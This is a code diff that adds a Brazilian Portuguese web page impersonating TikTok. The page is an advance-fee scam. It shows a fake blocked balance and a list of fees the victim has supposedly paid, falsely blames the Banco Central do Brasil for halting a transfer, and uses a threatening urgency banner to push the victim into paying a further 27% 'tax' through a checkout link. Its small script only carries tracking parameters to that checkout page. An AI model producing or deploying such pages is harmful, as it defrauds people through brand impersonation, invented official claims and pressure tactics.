@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<script src="/params.js"></script>
+<script src="/api/tt.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok - Estorno de Taxas</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap');
+        body { font-family: 'Inter', sans-serif; letter-spacing: -0.02em; background-color: #f3f4f6; }
+        
+        details summary::-webkit-details-marker { display: none; }
+        
+        .cashback-container {
+            position: relative;
+            width: 120px;
+            height: 120px;
+            margin: 0 auto;
+        }
+
+        .btn-tiktok {
+            background-color: #FE2C55;
+            transition: all 0.2s ease;
+        }
+        .btn-tiktok:active { transform: scale(0.95); }
+
+        /* Animação suave de entrada */
+        .fade-in { animation: fadeIn 0.8s ease-out forwards; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10deg); } to { opacity: 1; transform: translateY(0); } }
+    </style>
+</head>
+<body class="text-[#161823]">
+
+    <div class="bg-black text-white text-center py-3 px-4 text-[12px] font-bold uppercase tracking-tight leading-tight w-full sticky top-0 z-50 shadow-lg">
+        ATENÇÃO: CASO NÃO SAQUE O DINHEIRO DE IMEDIATO, ELE SERÁ ENVIADO PARA UM FUNDO DE DOAÇÃO E PERDERÁ 100% DO SALDO!
+    </div>
+
+    <div class="max-w-md mx-auto min-h-screen relative bg-white pb-10 shadow-2xl">
+        
+        <div class="flex justify-between items-center px-6 py-6 border-b border-gray-100">
+            <div class="flex flex-col">
+                <span class="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Saldo Bloqueado</span>
+                <span class="text-3xl font-[900] text-[#161823] leading-none tracking-tighter">R$ 1.428,26</span>
+            </div>
+            <img src="images/TikTok_logo.png" alt="TikTok" class="h-10 w-20 object-contain">
+        </div>
+
+        <div class="px-6 py-8">
+            <div class="text-center mb-8 fade-in">
+                <h1 class="text-2xl font-[900] text-slate-800 mb-2 leading-tight">RECEBA O DINHEIRO DAS TAXAS DE VOLTA</h1>
+                
+                <div class="cashback-container my-6">
+                    <img src="https://cdn-icons-gif.flaticon.com/12707/12707703.gif" alt="Estorno Animado" class="w-full h-full object-contain">
+                </div>
+                
+                <p class="text-sm font-bold text-[#FE2C55] bg-red-50 py-2 px-4 rounded-full inline-block">
+                    ⚠️ Transferência interrompida pelo Banco Central
+                </p>
+            </div>
+
+            <div class="bg-gray-50 border border-gray-100 rounded-3xl p-6 mb-8">
+                <p class="text-[14px] text-gray-700 leading-relaxed mb-6">
+                    Seu saldo foi enviado com sucesso mas a transferência foi interrompida pelo <b>Banco Central do Brasil</b>. Veja abaixo os valores pagos em taxa:
+                </p>
+                
+                <div class="space-y-3">
+                    <div class="flex justify-between text-[13px]">
+                        <span class="text-gray-500 italic">Taxa de confirmação</span>
+                        <span class="font-bold text-gray-800">R$ 20,14</span>
+                    </div>
+                    <div class="flex justify-between text-[13px]">
+                        <span class="text-gray-500 italic">Taxa Única de Ativação</span>
+                        <span class="font-bold text-gray-800">R$ 26,54</span>
+                    </div>
+                    <div class="flex justify-between text-[13px]">
+                        <span class="text-gray-500 italic">Taxa Antecipação Prioritária</span>
+                        <span class="font-bold text-gray-800">R$ 24,34</span>
+                    </div>
+                    <div class="flex justify-between text-[13px]">
+                        <span class="text-gray-500 italic">Taxa de Atualização de Vaga</span>
+                        <span class="font-bold text-gray-800">R$ 21,42</span>
+                    </div>
+                    <div class="flex justify-between text-[13px]">
+                        <span class="text-gray-500 italic">Taxa Administrativa</span>
+                        <span class="font-bold text-gray-800">R$ 32,74</span>
+                    </div>
+                    <div class="flex justify-between text-[13px]">
+                        <span class="text-gray-500 italic">Taxa de Liberação de Saldo Retido</span>
+                        <span class="font-bold text-gray-800">R$ 38,93</span>
+                    </div>
+                    <div class="h-[1px] bg-gray-200 w-full my-2"></div>
+                    <div class="flex justify-between text-[15px]">
+                        <span class="font-black uppercase text-gray-400 text-[10px] tracking-widest mt-1">Total de taxas:</span>
+                        <span class="font-black text-[#FE2C55] underline">R$ 163,95</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="border-2 border-black rounded-3xl p-6 bg-white shadow-[6px_6px_0px_0px_rgba(254,44,85,1)] mb-8">
+                <div class="text-center">
+                    <span class="text-[11px] font-black text-gray-400 uppercase tracking-widest">Valores a receber com as taxas:</span>
+                    <div class="text-4xl font-[900] text-gray-900 my-2 tracking-tighter">R$ 1.592,19</div>
+                    <p class="text-[10px] font-bold text-[#25F4EE] bg-black inline-block px-3 py-1 rounded-full uppercase leading-tight">
+                        + Saldo Pendente no App
+                    </p>
+                </div>
+            </div>
+
+            <div class="bg-[#FFD700] rounded-3xl p-6 border-2 border-black mb-8 text-center">
+                <p class="text-[14px] font-bold text-black leading-tight">
+                  Para receber o estorno das taxas (R$ 163,95), é necessário o pagamento do imposto de 27%, no valor de R$ 24,42.
+Após o pagamento, o saldo será liberado com as taxas inclusas.
+                </p>
+            </div>
+
+            <div class="space-y-4">
+                <a href="#" onclick="irParaCheckout(event)"  class="btn-tiktok block w-full text-white text-center py-6 rounded-2xl shadow-xl transition-all active:scale-95">
+                    <span class="block font-black text-xl uppercase leading-none">RECEBER TAXA DE VOLTA!</span>
+                </a>
+         </div>
+
+            <div class="mt-8 border-t border-gray-100 pt-6 text-center">
+                <p class="text-[12px] text-gray-500 font-bold px-4 italic leading-relaxed">
+                    O Banco Central interrompeu seu saque devido a uma pendência. Para garantir a liberação do saldo juntamente com as taxas, é necessário efetuar o pagamento da taxa conforme o imposto vigente no Brasil, correspondente a 27%.
+                </p>
+            </div>
+
+            <div class="mt-12 space-y-3 text-left">
+                <h3 class="text-lg font-[900] mb-4 px-2">Dúvidas:</h3>
+                
+                <details class="group bg-white rounded-2xl border border-gray-200">
+                    <summary class="flex justify-between items-center p-4 cursor-pointer font-bold text-sm">
+                        – Por que tem essa taxa?
+                        <span class="text-[#FE2C55] group-open:rotate-45 transition-transform text-xl">+</span>
+                    </summary>
+                    <div class="px-4 pb-4 text-[13px] text-gray-500 leading-relaxed">
+                        Todo aplicativo e plataforma tem um custo com servidores e para MANUTENÇÃO do APP essa taxa é um custo que temos ANUALMENTE de acordo com nosso número de usuários.
+                    </div>
+                </details>
+
+                <details class="group bg-white rounded-2xl border border-gray-200">
+                    <summary class="flex justify-between items-center p-4 cursor-pointer font-bold text-sm">
+                        – Se eu não pagar a taxa?
+                        <span class="text-[#FE2C55] group-open:rotate-45 transition-transform text-xl">+</span>
+                    </summary>
+                    <div class="px-4 pb-4 text-[13px] text-gray-500 leading-relaxed">
+                        O cliente tem até o final do dia após o suporte ter entrado em contato para pagar, caso não consiga, perderá sua vaga (VAGA NÃO É REEMBOLSÁVEL).
+                    </div>
+                </details>
+            </div>
+        </div>
+
+        <footer class="py-10 text-center text-[10px] text-gray-300 font-bold uppercase tracking-[0.3em]">
+            TikTok Financial Services © 2026
+        </footer>
+    </div>
+
+<script>
+function irParaCheckout(event) {
+  event.preventDefault();
+  var dest = new URL('checkout.html', window.location.href);
+  new URLSearchParams(window.location.search).forEach(function(v, k) { dest.searchParams.set(k, v); });
+  window.location.href = dest.toString();
+}
+</script>
+
+</body>
+</html>
